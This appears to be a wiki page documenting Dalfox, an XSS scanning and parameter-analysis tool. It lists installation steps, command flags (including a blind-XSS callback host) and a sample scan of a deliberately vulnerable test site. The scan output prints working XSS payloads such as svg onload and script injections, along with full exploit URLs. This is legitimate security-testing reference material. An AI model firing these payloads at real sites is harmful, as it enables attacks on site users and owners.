---
title : "Dalfox"
# pre : ' '
description : "XSS Scanning and Parameter Analysis tool."
date : 2020-05-12T12:28:52+02:00
# hidden : true
# draft : true
weight : 0
tags : ['Other','XSS']
---

## Dalfox

XSS Scanning and Parameter Analysis tool.

### Installation

```plain
git clone https://github.com/hahwul/dalfox
go install
~/go/bin/dalfox
```

### Usage

```plain
dalfox [command]
```

### Flags

```plain
Available Commands:
  file        Use file mode(targets list or rawdata)
  help        Help about any command
  pipe        Use pipeline mode
  url         Use single target mode
  version     Show version

Flags:
  -b, --blind string            Add your blind xss (e.g -b https://hahwul.xss.ht)
      --config string           Using config from file
  -C, --cookie string           Add custom cookie
      --custom-payload string   Add custom payloads from file
  -d, --data string             Using POST Method and add Body data
      --delay int               Milliseconds between send to same host (1000==1s)
      --found-action string     If found weak/vuln, action(cmd) to next
      --grep string             Using custom grepping file (e.g --grep ./samples/sample_grep.json)
  -H, --header string           Add custom headers
  -h, --help                    help for dalfox
      --only-discovery          Only testing parameter analysis
  -o, --output string           Write to output file
      --output-format string    -o/--output 's format (txt/json/xml)
  -p, --param string            Only testing selected parameters
      --proxy string            Send all request to proxy server (e.g --proxy http://127.0.0.1:8080)
      --silence                 Not printing all logs
      --timeout int             Second of timeout (default 10)
      --user-agent string       Add custom UserAgent
  -w, --worker int              Number of worker (default 40)

Use "dalfox [command] --help" for more information about a command.
```

### Examples

```plain
$ dalfox url http://testphp.vulnweb.com/listproducts.php\?cat\=123\&artist\=123\&asdf\=ff

    _..._
  .' .::::.   __   _   _    ___ _ __ __
 :  :::::::: |  \ / \ | |  | __/ \\ V /
 :  :::::::: | o ) o || |_ | _( o )) (  
 '. '::::::' |__/|_n_||___||_| \_//_n_\
   '-.::''

Parameter Analysis and XSS Scanning tool based on golang
Finder Of XSS and Dal is the Korean pronunciation of moon. @hahwul
[*] Using single target mode
[*] Target URL: http://testphp.vulnweb.com/listproducts.php?cat=123&artist=123&asdf=ff
[*] Vaild target [ code:200 / size:4699 ]
[*] Start parameter analysis.. 🔍
[*] Start static analysis.. 🔍
[I] Content-Type is text/html
[I] Reflected cat param => inHTML[1]   $
    48 line:    Error: Unknown column '123DalFox' in 'where cl
[*] Generate XSS payload and optimization.Optimization.. 🛠
[*] Start XSS Scanning.. with 230 queries 🗡
[W] Reflected Payload in HTML: cat="><script/"<a"/src=data:=".<a,[45].some(confirm)>
    48 line:  syntax to use near '"><script/"<a"/src=data:=".<a,[45].some(confirm)>' at line 1
    +> http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B45%5D.some%28confirm%29%3E
[V] Triggered XSS Payload (found DOM Object): cat="><svg/OnLoad="`${prompt``}`" class=dalfox>
    48 line:  syntax to use near '"><svg/OnLoad="`${prompt``}`" class=dalfox>' at line 1
    +> http://testphp.vulnweb.com/listproducts.php?artist=123&asdf=ff&cat=123%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
[*] Finish :D
```

### URL list

* [GitHub.com - dalfox](https://github.com/hahwul/dalfox)
